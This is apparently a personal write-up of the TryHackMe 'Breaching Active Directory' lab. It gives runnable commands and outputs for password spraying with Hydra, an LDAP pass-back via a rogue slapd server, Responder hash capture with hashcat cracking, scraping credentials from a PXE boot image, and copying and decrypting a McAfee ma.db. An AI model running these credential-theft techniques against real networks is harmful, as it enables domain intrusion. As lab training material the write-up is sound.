# Breaching Active Directory - TryHackMe Network Writeup

**Status:** Completed notes
**Network:** `za.tryhackme.com`
**Primary host:** `10.200.70.101 THMDC.za.tryhackme.com`
**Scope:** Active Directory initial access techniques

---

## Attack Chain Overview

```text
OSINT password          → NTLM password spray      → valid domain users
Printer LDAP settings   → rogue LDAP server         → cleartext svcLDAP password
Responder poisoning     → NetNTLMv2 capture         → hashcat crack
PXE boot image scrape   → bootstrap.ini extraction  → svcMDT credentials
McAfee ma.db extraction → encrypted passwd decrypt  → svcAV credentials
```

---

## Table of Contents

1. [Host Configuration](#host-configuration)
2. [OSINT Password](#osint-password)
3. [NTLM Password Spraying](#ntlm-password-spraying)
4. [LDAP Pass-Back Attack](#ldap-pass-back-attack)
5. [SMB NetNTLM Capture](#smb-netntlm-capture)
6. [PXE Boot Image Credential Scraping](#pxe-boot-image-credential-scraping)
7. [McAfee ma.db Credential Recovery](#mcafee-madb-credential-recovery)
8. [Credentials Summary](#credentials-summary)
9. [Key Takeaways](#key-takeaways)

---

## Host Configuration

The lab domain was added to hosts resolution so the DC and base domain resolved correctly.

```text
10.200.70.101 THMDC.za.tryhackme.com za.tryhackme.com
```

---

## OSINT Password

OSINT provided an initial password that could be tested safely against many users.

```text
Changeme123
```

---

## NTLM Password Spraying

`https://ntlmauth.za.tryhackme.com/` used NTLM authentication. Hydra tested the OSINT password against a username list and found several valid accounts.

```bash
# What it does: spray a single password against a list of usernames via NTLM-authenticated HTTP.
# Why here: validate the OSINT password across the domain user list to find valid accounts.
hydra -L usernames.txt -p Changeme123 ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'
```

Full technique: [password-spraying.md](../../../../exploits/ad/password-spraying.md)
Tool note: [hydra](../../../../tools/creds/hydra.md)

---

## LDAP Pass-Back Attack

The printer panel at `https://printer.za.tryhackme.com/settings` required no credentials and exposed the LDAP username `svcLDAP`, but hid the password. Redirecting LDAP to the attacker and lowering SASL requirements on a rogue `slapd` server made the connection test send cleartext credentials, captured with `tcpdump`.

```bash
# What it does: start a raw TCP listener on the LDAP port.
# Why here: verify the printer sends a connection to the attacker when the LDAP server is changed.
nc -lvp 389

# What it does: install and configure a rogue slapd server with weak SASL requirements.
# Why here: force the printer to send cleartext credentials instead of hashed NTLM.
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
ldapsearch -H ldap://localhost -x -s base -b "" supportedSASLMechanisms

# What it does: capture the LDAP bind request with full packet contents.
# Why here: extract the cleartext password from the printer's LDAP authentication attempt.
sudo tcpdump -SX -i breachad tcp port 389
```

**Captured credential:**

```
svcLDAP : tryhackmeldappass1@
```

Full technique: [ldap-passback-attack.md](../../../../exploits/ad/ldap-passback-attack.md)
Tool notes: [netcat](../../../../tools/pivot/netcat.md), [tcpdump](../../../../tools/creds/tcpdump.md)

---

## SMB NetNTLM Capture

Responder on the `breachad` interface captured a NetNTLMv2 challenge for `ZA\svcFileCopy`. Hashcat mode `5600` cracked it with `rockyou.txt`.

```bash
# What it does: start Responder to poison LLMNR/NBT-NS and capture NetNTLMv2 hashes.
# Why here: intercept authentication attempts from hosts on the breachad network segment.
sudo responder -I breachad

# What it does: crack the captured NetNTLMv2 hash with hashcat.
# Why here: recover the cleartext password for svcFileCopy.
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 5600 hash  --show
```

**Recovered credential:**

```
svcFileCopy : FPassword1!
```

---

## PXE Boot Image Credential Scraping

### Background

Large organisations use **Microsoft Deployment Toolkit (MDT)** with **PXE Boot** to deploy operating systems automatically over the network. When a new machine boots, it requests the install image via DHCP/TFTP. The security issue is that these images can contain domain credentials stored in plaintext inside `bootstrap.ini`, which MDT needs to authenticate against the deployment server during installation.

**Attack flow:**
```
DHCP response → MDT server IP + BCD filename
  → TFTP download BCD file
    → parse BCD to find WIM image path
      → TFTP download WIM image (~340MB)
        → extract bootstrap.ini → plaintext credentials
```

---

### Step 1: Get the BCD filename

We access the PXE server URL to list available BCD files. These files store boot configuration for different hardware architectures.

```
http://pxeboot.za.tryhackme.com
```

**Output:**
```
x64{2496BF6F-AC37-42F0-B0DB-F8B7417A6B6A}.bcd
```

> **Note:** These filenames regenerate daily. Always copy the current name from the web before proceeding.

---

### Step 2: Connect to the jump host

Since we need TFTP to download files, we use `THMJMP1`, to which we have SSH access, as a transfer point.

```bash
# What it does: connect to the jump host via SSH.
# Why here: access the internal network where TFTP to the MDT server is reachable.
ssh thm@THMJMP1.za.tryhackme.com
# Password: Password1@
```

```cmd
REM What it does: set up a working directory and copy PowerPXE tools.
REM Why here: prepare the environment for BCD parsing and WIM extraction.
cd C:\Users\THM\Documents
mkdir <username>
copy C:\powerpxe <username>\
cd <username>
```

---

### Step 3: Download and parse the BCD file

We use TFTP to download the BCD file from the MDT server. BCD files are always in the `/Tmp/` directory. Then we use **PowerPXE** to extract the WIM image path from it.

```cmd
REM What it does: resolve the MDT server hostname and download the BCD boot configuration file.
REM Why here: obtain the BCD file needed to extract the WIM image path for credential scraping.
nslookup thmmdt.za.tryhackme.com

tftp -i 10.200.70.202 GET "\Tmp\x64{2496BF6F-AC37-42F0-B0DB-F8B7417A6B6A}.bcd" conf.bcd
```

```powershell
# What it does: parse the BCD file with PowerPXE to extract the WIM image path.
# Why here: identify the location of the PXE boot image containing bootstrap.ini.
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
```

**Output:**
```
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim
```

---

### Step 4: Download the WIM image

With the image path identified, we download it in full via TFTP. It's a large file (~340MB) and may take several minutes.

```cmd
REM What it does: download the full WIM boot image via TFTP.
REM Why here: obtain the PXE image file that contains the bootstrap.ini with cleartext credentials.
tftp -i 10.200.70.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

---

### Step 5: Extract credentials from bootstrap.ini

PowerPXE searches inside the WIM image for `bootstrap.ini`, which MDT uses to authenticate to the deployment server. This file contains credentials in cleartext.

```powershell
# What it does: extract credentials from bootstrap.ini inside the WIM image.
# Why here: recover the MDT service account password stored in plaintext.
Get-FindCredentials -WimFile pxeboot.wim
```

**Output:**
```
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
```

**Recovered credential:**

```
ZA\svcMDT : PXEBootSecure1@
```

---

## McAfee ma.db Credential Recovery

### Background

**McAfee Enterprise Endpoint Security** (and other centrally deployed applications) need to authenticate against the domain during installation and operation. McAfee stores these credentials in a SQLite database called `ma.db`, located at a fixed system path. The password field is encrypted, but with a known key, which means it can be decrypted with a public tool. This technique applies to any centralised management application that stores credentials locally in configuration files.

**Attack flow:**
```
Local access on breached host
  → copy ma.db via SCP
    → open with sqlitebrowser → table AGENT_REPOSITORIES
      → grab AUTH_USER + AUTH_PASSWD (base64+encrypted)
        → decrypt with mcafee_sitelist_pwd_decrypt.py → plaintext password
```

---

### Step 1: Locate and copy the database

The `ma.db` database is always at the same path on every host where McAfee Agent is installed.

```cmd
REM What it does: navigate to the McAfee Agent database directory.
REM Why here: locate the ma.db file containing encrypted domain service credentials.
cd C:\ProgramData\McAfee\Agent\DB
dir
```

**Output:**
```
03/05/2022  10:03 AM       120,832 ma.db
```

```bash
# What it does: copy the McAfee database to the attacker machine via SCP.
# Why here: exfiltrate the ma.db for offline credential extraction.
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

---

### Step 2: Open the database and find the credentials

We open the database with `sqlitebrowser` and navigate to the `AGENT_REPOSITORIES` table. We're interested in the second entry: the `DOMAIN`, `AUTH_USER`, and `AUTH_PASSWD` fields.

```bash
# What it does: open the SQLite database in a graphical browser.
# Why here: inspect the AGENT_REPOSITORIES table for the encrypted service account credentials.
sqlitebrowser ma.db
```

**Values found:**

| Field | Value |
|---|---|
| AUTH_USER | `svcAV` |
| AUTH_PASSWD | `jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==` |

> The password is encrypted with McAfee's own algorithm (not plain base64). A specific script is needed to decrypt it.

---

### Step 3: Decrypt the password

McAfee encrypts `AUTH_PASSWD` with a known, fixed key. We use the public script `mcafee_sitelist_pwd_decrypt.py` to recover the plaintext password.

```bash
# What it does: decrypt the McAfee AUTH_PASSWD field using the known encryption key.
# Why here: recover the cleartext password for the svcAV domain service account.
# Repo: https://github.com/funoverip/mcafee-sitelist-pwd-decryption
python2 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

**Output:**
```
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```

**Recovered credential:**

```
ZA\svcAV : MyStrongPassword!
```

---

## Credentials Summary

| User | Password | Method |
|---|---|---|
| (spray accounts) | `Changeme123` | OSINT + NTLM spray |
| `svcLDAP` | `tryhackmeldappass1@` | LDAP pass-back |
| `svcFileCopy` | `FPassword1!` | Responder + hashcat |
| `svcMDT` | `PXEBootSecure1@` | PXE boot image scrape |
| `svcAV` | `MyStrongPassword!` | McAfee ma.db decrypt |

---

## Key Takeaways

- Configuration files from centrally deployed applications are an excellent source of domain credentials.
- PXE Boot can expose service credentials in cleartext if `bootstrap.ini` is not properly protected.
- McAfee Agent stores credentials encrypted with a publicly known key, which is effectively equivalent to storing them in plaintext from an attacker's perspective.
- Upon any host foothold, follow a systematic methodology: enumerate config files, local databases, registry keys, and centralised management applications.

---

## Related Notes

- [password-spraying.md](../../../../exploits/ad/password-spraying.md)
- [ldap-passback-attack.md](../../../../exploits/ad/ldap-passback-attack.md)
- Tool: [Responder](../../../../tools/creds/responder.md)
- Tool: [PowerPXE](https://github.com/wavestone-cdt/powerpxe)
- Tool: [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)
